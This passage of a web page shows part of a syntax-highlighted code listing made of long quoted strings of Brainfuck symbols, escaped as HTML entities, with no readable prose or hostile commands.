&quot;--&gt;&lt;+-+-&gt;&lt;-+&gt;-+&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;]&lt;-[&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;+-+&gt;[&gt;&lt;-&lt;&gt;&lt;&gt;+-][&lt;--+.[&lt;[[.,[...],],.]&gt;,&lt;-.]]]+-&quot;</span><br><span class="line">    &quot;,+-&gt;+&gt;&lt;-+++&gt;&lt;+-+-&gt;&lt;+&lt;&gt;-+-+++-+&gt;&lt;+-+&gt;&lt;&lt;&gt;[-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;--+&lt;&gt;&lt;&gt;+-----+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;&gt;-+-+-+-&quot;</span><br><span class="line">    &quot;+-&gt;&lt;+--+-+]+-&lt;&lt;&gt;+-&gt;&lt;-&gt;&lt;-+-++-[-+&gt;&lt;&lt;-++--+++-+-+--+&gt;&gt;&lt;+-&gt;&lt;+-[&gt;&lt;+-&gt;&lt;+-&lt;&gt;--+&lt;&gt;&lt;&gt;+-]&gt;&lt;&lt;&gt;&gt;&lt;][&gt;,,-]-+&lt;&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;,&lt;&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;+&gt;&lt;+-++-++-+-&lt;&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;++-&lt;&gt;+-&gt;&lt;+&lt;&gt;-++[&gt;&lt;&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;-++-&gt;&lt;-&gt;&lt;-&lt;&gt;+----+--&lt;&quot;</span><br><span class="line">    &quot;&gt;-+-++-&lt;&gt;&gt;&gt;&lt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][&gt;&gt;[-&gt;[,&lt;&lt;]],.[&lt;+.[,-.[,[+[-[&lt;&gt;&gt;,.[-+[&gt;.&gt;&lt;[.&lt;.,&lt;&gt;.]].-],]&gt;..&lt;&lt;]]&lt;.,]&lt;++&gt;]-+.&quot;</span><br><span class="line">    &quot;+&gt;]]+-&lt;&gt;&lt;[+--+&gt;&lt;&lt;&gt;-+&lt;+-+&lt;&gt;&lt;&gt;-+&lt;&gt;&gt;-++-&gt;&lt;+--+[-+--++-][[.-[+[.&gt;&gt;[,-&gt;-]&gt;[[.-&lt;..&lt;[.,[.+[-+,[.&lt;,&gt;].,,[&lt;.&gt;&quot;</span><br><span class="line">    &quot;+-&lt;.]-+&gt;]..]&lt;-+.++].]]&lt;]+],&gt;]-..+-]+-]&lt;&gt;,-++-+-&gt;&lt;+-&gt;&gt;&lt;&lt;&gt;+&gt;&lt;+-&lt;&gt;+-++-+-+&gt;&lt;+-+&gt;&lt;&lt;&gt;+&lt;&gt;[&gt;&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;-&gt;&lt;-+-&lt;&gt;&lt;&gt;--+-+&gt;&lt;--&gt;&lt;-&gt;&lt;&lt;&gt;+-&gt;&lt;-&lt;&gt;--++-&lt;&gt;+-&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-++---+&lt;&gt;-+-&gt;-+-+-&gt;&lt;&gt;&lt;+--+][[-.&gt;-[]&gt;+.]&gt;&lt;[[+[+[+&quot;</span><br><span class="line">    &quot;&lt;[..&gt;[&lt;.[&gt;&gt;++,]&gt;---]++[-&lt;.[+&lt;&gt;&lt;[,[-,+-,]&gt;[&lt;,&gt;]&lt;&lt;&gt;]+-]]][-[,[-,+-[+&gt;[&gt;,+&lt;]&lt;&gt;.[.&lt;&gt;.-]]+]&lt;.]&gt;]..]]+.+[-&quot;</span><br><span class="line">    &quot;[+&lt;,[[..-[,+.[&gt;[&lt;]+[&gt;].]+&lt;],.[[.[,-.].[+,&gt;,]--][,[+&lt;.].&lt;[+].&lt;],&gt;],&lt;,],&gt;&gt;]+[.&lt;&gt;..,]-+,]+&gt;,&gt;]-]--&lt;]&lt;++&quot;</span><br><span class="line">    &quot;]&lt;+--+-+-&gt;&lt;[+-&gt;&lt;&gt;&lt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&gt;&lt;+-+-+&lt;&gt;+-&gt;&lt;&gt;[&lt;&gt;-+-+-+-][&gt;[,[-+&lt;[-[&gt;&gt;[,&gt;+[&lt;[&lt;&lt;&lt;&lt;&lt;.]-[&gt;-[&gt;-.[.-&lt;.&gt;]]..&lt;]]&quot;</span><br><span class="line">    &quot;-&gt;&lt;]&gt;&gt;&lt;[&gt;-[,+[,,[+[.+]++-][.,.[+&gt;&lt;&lt;-]-]+]-&lt;.]&gt;-.&gt;]+-][-]]][[.,[.-&lt;[[&gt;+&lt;+&gt;&gt;&lt;]-[[.---[-&lt;+.&gt;&gt;]][.[&gt;[.&gt;&lt;&quot;</span><br><span class="line">    &quot;]+[-,,],]&gt;+]]]-].+,&lt;],&gt;-.]&gt;&lt;,]-&lt;-[&lt;-[[[&gt;&lt;&gt;&gt;&gt;[,&gt;&gt;&gt;&lt;.[.&lt;-++[&gt;&gt;-+,[.&gt;&lt;[]++&gt;]++]]&lt;],][+.&gt;-+]]+,[-+&gt;[,&gt;+&gt;&quot;</span><br><span class="line">    &quot;+[,,-[-&gt;+[&gt;&gt;[+.-+&gt;[++-,.&lt;&gt;]+].,]&lt;,]&lt;]-&gt;-]&lt;++]-&gt;.]-.-]-,]&gt;&lt;&gt;&lt;][&gt;.+]&lt;&gt;&lt;&gt;,-+&lt;&gt;+-&gt;&lt;&gt;+-++--++-++-+-++&lt;&gt;-+&quot;</span><br><span class="line">    &quot;-+-++&lt;&gt;-++&gt;&lt;-+[&lt;-&lt;&gt;-+---+&gt;&lt;-++--+-&gt;&lt;&gt;&lt;--+&gt;&lt;--+-+&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;-+-&gt;&lt;-&gt;-+&lt;&gt;-]+-+-+-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+&quot;</span><br><span class="line">    &quot;&lt;&gt;&gt;&lt;--+-+&lt;&gt;-+-[-+&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;&lt;&gt;+-+-+&gt;&lt;&lt;&gt;&lt;&gt;&gt;[+--+-&lt;&gt;&gt;&lt;-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;-+][&gt;,&lt;,&gt;.]+-,&gt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&lt;&gt;++-+&lt;&gt;&gt;&quot;</span><br><span class="line">    &quot;&lt;+-++-++-+-++-[-++-&lt;-++--+-&lt;&gt;-+--+--+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+&gt;&lt;&lt;&gt;-&lt;&gt;&lt;&gt;--+-&gt;&lt;-+&lt;&gt;+--&gt;&lt;&lt;&gt;+-&gt;&lt;--+-++--+&gt;&lt;--&lt;&gt;--+-+&quot;</span><br><span class="line">    &quot;-&gt;&lt;&lt;&gt;-+-&gt;&lt;+-&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-&gt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;--++-+-&gt;&lt;]&lt;&gt;&lt;+-&lt;&gt;+-&gt;&lt;-&lt;&gt;-+[&gt;&lt;+-&gt;&lt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[&gt;&lt;&quot;</span><br><span class="line">    &quot;-+-&lt;&gt;]]&gt;&lt;&lt;&gt;,&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;++&gt;&lt;&gt;&lt;&lt;&gt;-++-+&gt;&lt;-++-&lt;&gt;+&lt;&gt;+&gt;&lt;-+-+&gt;&lt;[&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&lt;--+-+-+&gt;&lt;-&lt;&gt;&gt;&lt;+--+--+--&gt;&lt;+-&gt;&lt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;--+-+--&lt;&gt;+--&gt;&lt;&gt;&lt;+-+--+&gt;&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;+-]&gt;-[.&lt;&gt;]][&lt;+&lt;,--]&lt;+].,&gt;][&quot;</span><br><span class="line">    &quot;&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;+-,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;-+-+---+&lt;&gt;-+-[&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;-+-+-+-++&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;[&lt;&gt;-+&gt;&lt;-&quot;</span><br><span class="line">    &quot;][+&gt;-+-&lt;+]&lt;&gt;&gt;&lt;+-+--+]&lt;&gt;-+,+--+-+&lt;&gt;&gt;+-+-++&gt;&lt;+-&lt;&gt;++-&lt;&gt;+&lt;&gt;+-&gt;&lt;+&gt;&lt;&gt;&lt;+[&lt;+--+--+-+&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;&gt;&lt;-&gt;&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;&lt;&gt;-+--++--+--++-&lt;&gt;+--&lt;&gt;&gt;&lt;+-&lt;&gt;+--+-+--+-&lt;&gt;-+-&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;--+--+-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-+-+--+-+&lt;&gt;-+&gt;-+&gt;&lt;-+&quot;</span><br><span class="line">    &quot;&lt;&gt;-&lt;&gt;][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[-+&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&lt;&gt;&gt;-]-+]+-,&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&quot;</span><br><span class="line">    &quot;&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,]+-,]]].]&lt;,.]&gt;&lt;&gt;&lt;&lt;&lt;&gt;+--+--+-+-[+--+&lt;&gt;&lt;&gt;-+&lt;+-+&gt;&lt;&gt;[--++-][.&gt;+[&quot;</span><br><span class="line">    &quot;&gt;[.+,[&gt;&lt;[-&lt;.,&lt;[+,-.]]].,-]&gt;[-&lt;&gt;-&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[&quot;</span><br><span class="line">    &quot;[-+[,-+.]-[+-.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,&lt;&gt;-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.&quot;</span><br><span class="line">    &quot;[&lt;,-&gt;]&lt;-],,]+-]+,],-]&lt;]-&gt;,]&gt;&gt;].]-+&lt;&gt;][&lt;&lt;-+]&lt;&gt;+-+-&lt;&gt;-+,&gt;&lt;&gt;+--+&gt;&lt;&gt;&lt;&lt;&gt;+&lt;&gt;&lt;&gt;-+&lt;&gt;-++&lt;&gt;&lt;&gt;&gt;&lt;-++&gt;&lt;+&gt;&lt;&gt;&lt;+&gt;&lt;-+&quot;</span><br><span class="line">    &quot;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;[&gt;&lt;&gt;&lt;&lt;&gt;&lt;-&lt;&gt;-+&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&gt;&lt;+--&lt;&gt;-++-&lt;&gt;&lt;&gt;--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;+--&lt;&gt;-++-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+--]+-+-+-&quot;</span><br><span class="line">    &quot;&lt;+-&lt;&gt;&gt;&lt;&lt;&gt;-+[+--+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+&lt;&gt;&gt;&lt;&gt;+-[&gt;&lt;&lt;&gt;-++--+-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&gt;&lt;&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.&quot;</span><br><span class="line">    &quot;]].&gt;&lt;]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+&lt;&gt;]&gt;.&lt;]&lt;&lt;,.][.+&lt;&gt;]&gt;,&lt;],-,],&gt;&lt;]&lt;&gt;].&lt;&quot;</span><br><span class="line">    &quot;-+.].+]&lt;&lt;&gt;]][&lt;&gt;+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+&gt;&lt;],.+]&lt;.],-+-+&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;&lt;&gt;++-&gt;&lt;+-&gt;&lt;++--++&lt;&gt;&gt;&lt;&lt;&gt;+&quot;</span><br><span class="line">    &quot;-+&lt;&gt;&lt;&gt;+-+-++&gt;&lt;++&gt;&lt;-+&gt;&lt;-+[&gt;&lt;&lt;-++--+-+--+-+--+&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+--&gt;&lt;&gt;&lt;&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;--++-&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;&lt;&gt;[-,,[&lt;-+-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;&quot;</span><br><span class="line">    &quot;++]++&gt;&lt;&lt;]+,,][&gt;&lt;+.-&gt;]--+][..,]&gt;&gt;-]&gt;&lt;+--+&lt;&gt;&lt;+---[-++-&gt;&lt;-+&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-++&lt;&gt;-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;&gt;&lt;[-]+-&gt;&lt;+-]-+-+&gt;&quot;</span><br><span class="line">    &quot;&lt;+-,-+&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;++-+--++++-++-&lt;&gt;&gt;&lt;[&lt;&gt;+--+&lt;-+--+-&gt;&lt;+---+-+-++-&quot;</span><br><span class="line">    &quot;+--&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&gt;+--][.[[&lt;&gt;.++&gt;[&gt;.[++.&gt;][,&lt;-+[.[[&lt;&lt;&gt;[+&gt;&gt;+[.&gt;&lt;&lt;.-]&lt;&gt;&gt;][+-+--].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[&quot;</span><br><span class="line">    &quot;.---&lt;+.]]&gt;&lt;-++-&lt;&gt;&lt;&gt;&lt;-&lt;&gt;-+-+&lt;&gt;-+[-+-++-+-&lt;&gt;&lt;+&lt;&gt;-+&lt;&gt;&gt;&gt;&lt;-+[&lt;&gt;-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[&lt;&gt;,--][&gt;,[--+-,&gt;.]-+&lt;&lt;&gt;&quot;</span><br><span class="line">    &quot;]-.-]+.]+--+],&gt;&lt;&gt;&lt;-++-&gt;+&lt;&gt;+-+-+&gt;&lt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+-+-++&lt;&gt;+--++-&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+-++-&lt;&gt;&lt;&gt;-+[&lt;-+--&gt;&lt;&gt;&lt;+-----&gt;&lt;&quot;</span><br><span class="line">    &quot;&lt;&gt;+--&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;]-++-&lt;&gt;&lt;-+&gt;&lt;-+[+-&lt;&gt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;-+&lt;&gt;-+-+&gt;[-+-][+&gt;-[&gt;&gt;&lt;[[+&gt;,.+].&lt;]]-[,-&gt;&lt;]&lt;,.]&lt;&gt;&gt;&lt;-&quot;</span><br><span class="line">    &quot;+]+-,&gt;&lt;&lt;&gt;&lt;&gt;+--+&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&gt;&lt;-++&gt;&lt;&lt;&gt;+&gt;&lt;+-++&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;++--+&gt;&lt;++--+&gt;&lt;-++-+&lt;&gt;&lt;&gt;++-+-&lt;&gt;-+&gt;&lt;[&gt;&lt;&gt;&lt;+&quot;</span><br><span class="line">    &quot;-&lt;--&gt;&lt;+-+---+-+-+-+-+-&lt;&gt;-+&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;-+--+--+&gt;-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;--+-+-+][[-&lt;-[++-[&lt;.[.&gt;,.&gt;+-]&gt;,&lt;-]-&gt;&quot;</span><br><span class="line">    &quot;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;--&gt;&lt;-+&gt;&lt;&gt;&lt;+--&gt;&lt;-+&gt;&lt;&lt;&gt;+--&lt;&gt;&gt;&lt;--+[+-&lt;&gt;&lt;+&lt;&gt;-+&gt;[&gt;&lt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;]&quot;</span><br><span class="line">    &quot;[&gt;&lt;+[-,&lt;&lt;&gt;+],-]&lt;&gt;]+-&lt;&gt;-+,+--+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+--+&gt;&lt;+-+-+++&lt;&gt;&gt;&lt;++--++-+-+&lt;&gt;+-&gt;&lt;+[&lt;&gt;&lt;--++-&lt;&gt;-&gt;&lt;-+-&lt;&gt;&gt;&lt;+-+--+-&quot;</span><br><span class="line">    &quot;&gt;&lt;-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;-+-&lt;&gt;+-+-&lt;&gt;&lt;&gt;&gt;-+-+&gt;&lt;&gt;&lt;--+&lt;&gt;-+-+][.-[-[-&gt;.-+&gt;+,]+-[-&lt;&gt;]-,,]&lt;&lt;&gt;]&gt;&lt;-+-+&lt;-&lt;&gt;&lt;&gt;-++&quot;</span><br><span class="line">    &quot;-&gt;&lt;--[&gt;&lt;&lt;&gt;-+&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;-+[-&lt;&gt;]]&lt;&gt;&gt;&lt;,&gt;&lt;+-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;-++-++-++-+&lt;&gt;&gt;&lt;++-&gt;&lt;+&gt;&lt;&gt;&lt;+--++[-+&lt;&gt;+--++-&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;-++----+&gt;&lt;+--&gt;&lt;&gt;&lt;+--+-&lt;&gt;-++--+--++-&lt;&gt;-+-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-][..&lt;&gt;&lt;-]-+&lt;-+-+--&gt;&lt;&lt;&gt;+-[+-+-&gt;&lt;&lt;&gt;&quot;</span><br><span class="line">    &quot;+-&lt;-++-+-++-&gt;&lt;&gt;&lt;&gt;[+-&gt;&lt;--+&gt;&lt;][&gt;[-&lt;&gt;-][.&gt;-,--]-]&lt;&gt;+-]-++-&lt;&gt;&gt;&lt;&lt;&gt;,+-&gt;-++&lt;&gt;++-&lt;&gt;&gt;&lt;+-+&lt;&gt;+&gt;&lt;+-+&lt;&gt;+-&lt;&gt;+++-+&gt;&quot;</span><br><span class="line">    &quot;&lt;[&lt;&gt;&lt;&gt;-+&gt;&lt;&gt;&lt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;+---&lt;&gt;+---+--+&gt;&lt;--+&gt;&lt;-&gt;&lt;+-&gt;-++-&lt;&gt;-+&lt;&gt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.]+-.]-&quot;</span><br><span class="line">    &quot;+&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;[+--+-+&gt;&lt;+-&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+-+++-&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;&lt;[+-+-+-&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;+-][&lt;-&lt;[&gt;&gt;].]-+&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&lt;&gt;,&gt;&gt;&lt;+&quot;</span><br><span class="line">    &quot;-+&gt;&lt;-++--++-+&lt;&gt;+-++-+--+&lt;&gt;++-+&gt;&lt;+-&lt;&gt;+&gt;&lt;++-&lt;&gt;+-+-&lt;&gt;+&lt;&gt;+--+&lt;&gt;&lt;&gt;[&gt;&lt;+--+-+&lt;-+&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-+--+-+&lt;&gt;-&gt;&lt;&quot;</span><br><span class="line">    &quot;+--+-+-+-+-&lt;&gt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+-&lt;&gt;-+-+---+&gt;-+-++--+-&gt;&lt;-+][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;&lt;&gt;[-,[+.[[[&quot;</span><br><span class="line">    &quot;.[,],[-&lt;,&gt;-]+-].-.]&lt;-[,+&gt;[.[+.+]]&gt;&lt;,]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&gt;&lt;&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;&gt;&lt;--&gt;&lt;--++-&lt;&gt;[&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;-+&gt;&lt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&gt;-+-++-&gt;&lt;[&lt;&gt;&lt;&gt;-+&lt;&gt;+--&lt;&gt;][.[,[[.&lt;[[+&gt;&lt;&lt;&gt;+]+.-],++,.]++].,,].[.[&lt;+-[&gt;,&gt;-++]&lt;+]&lt;]]&lt;&quot;</span><br><span class="line">    &quot;&gt;][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[+-&lt;.,--]&gt;],]&gt;+&gt;-&gt;]-+[-&lt;[[+[[&gt;&gt;+-,.&lt;]&lt;]+-]+[+.[++[],&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&quot;</span><br><span class="line">    &quot;&gt;&gt;[+&gt;[++-+&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,+-,&gt;+]&lt;&gt;]].--],++].]&lt;]&gt;-[+,+&gt;.],--]&lt;&gt;,-+-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;+-+-&quot;</span><br><span class="line">    &quot;++-+-++++-&lt;&gt;+--++-++&gt;&lt;&lt;&gt;&gt;&lt;-++&lt;&gt;+-[&gt;&lt;&lt;&gt;&gt;&lt;-+-+&lt;&lt;&gt;-+--+--+-+-&lt;&gt;&gt;&lt;&lt;&gt;--+-++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+&gt;&lt;+--&lt;&gt;-+&lt;&gt;+&quot;</span><br><span class="line">    &quot;--&lt;&gt;-+-+--&gt;&lt;-++--+-&gt;&lt;+-&gt;--+]-++-&lt;--+&gt;&lt;&lt;&gt;--&gt;&lt;&gt;&lt;+-&gt;&lt;+--&lt;&gt;-+-&lt;&gt;+-+---+&lt;&gt;[&lt;-+&lt;&gt;+&gt;+-&gt;&lt;&lt;&gt;[--+&gt;&lt;&lt;&gt;-+]&lt;&gt;-++-&quot;</span><br><span class="line">    &quot;]&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;,-+-++--++-&gt;&gt;&lt;-+-++-&lt;&gt;+-+-+-+&gt;&lt;-+++-+&gt;&lt;&lt;&gt;++--+&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;+&gt;&lt;-++-+[&lt;+-+--++-&lt;&gt;-+-&lt;&gt;&lt;&gt;--+&gt;&lt;&quot;</span><br><span class="line">    &quot;--+&gt;&lt;+-+-+---+-+&lt;&gt;-+&lt;&gt;-&gt;&lt;-+&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+---+&lt;&gt;-+-&gt;-++---++-+-&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&lt;&gt;-+[-+-+&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+&quot;</span><br><span class="line">    &quot;+--++&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;+-&gt;&lt;+-&lt;&gt;[-+-+&lt;&gt;--+&gt;&lt;+-+-&gt;&lt;][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]-+]+[&lt;,[&lt;+[-&lt;]]+]&quot;</span><br><span class="line">    &quot;+],..[+[.+&lt;[+[+--[&gt;&gt;&lt;-,-+.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]+-&gt;&lt;&lt;&gt;][&lt;[[.[-,,[.,&gt;[.,-&lt;&gt;-]&gt;]+.&gt;],+[+&gt;&lt;&gt;]],&quot;</span><br><span class="line">    &quot;&lt;+]&gt;]+-&gt;&lt;&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&gt;&lt;+-++&gt;&lt;+&lt;&gt;+-&lt;&gt;+&lt;&gt;-+-+&lt;&gt;+&gt;&lt;&lt;&gt;+&lt;&gt;-+-++-[&lt;&lt;&gt;-&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+-&quot;</span><br><span class="line">    &quot;-+-+-&gt;&lt;+-+-&lt;&gt;-&lt;&gt;-+-++--+-&gt;&lt;-+&gt;-+-+-+-&lt;&gt;+-+-][,&gt;--+,,+&lt;]&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;-+&lt;&gt;&lt;&gt;-&gt;&lt;+--+-+-+----&lt;&gt;[&lt;&lt;&gt;-+&gt;&lt;++-&quot;</span><br><span class="line">    &quot;&gt;&gt;&lt;-+-+[&lt;&gt;&gt;&lt;&lt;&gt;-+-][+,[-&gt;-,&gt;--..][,+[&lt;[[-+]&lt;+&lt;[,[[.,,,[,[&lt;[&gt;&lt;-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;&lt;&gt;.&gt;],,-&lt;+,]&quot;</span><br><span class="line">    &quot;-&lt;-]&gt;+[[+.][+[&lt;[&lt;[-+--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]&lt;&gt;+]+&gt;&gt;]&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;&lt;]&lt;&gt;&lt;&gt;,&lt;&gt;-+&lt;&gt;&gt;&lt;&gt;-+-+-+-++-+&gt;&lt;-+&gt;&lt;+&lt;&gt;+-+-&gt;&lt;-&quot;</span><br><span class="line">    &quot;++&gt;&lt;&lt;&gt;+-&lt;&gt;-++-+&lt;&gt;&lt;&gt;++-&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&lt;&gt;-++&gt;&lt;&lt;&gt;+-+-&gt;&lt;[-++-+-&gt;&lt;&lt;&lt;&gt;+-&lt;&gt;-+&gt;&lt;--+&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;-++--&gt;&lt;&lt;&gt;-+-&gt;&lt;-+&quot;</span><br><span class="line">    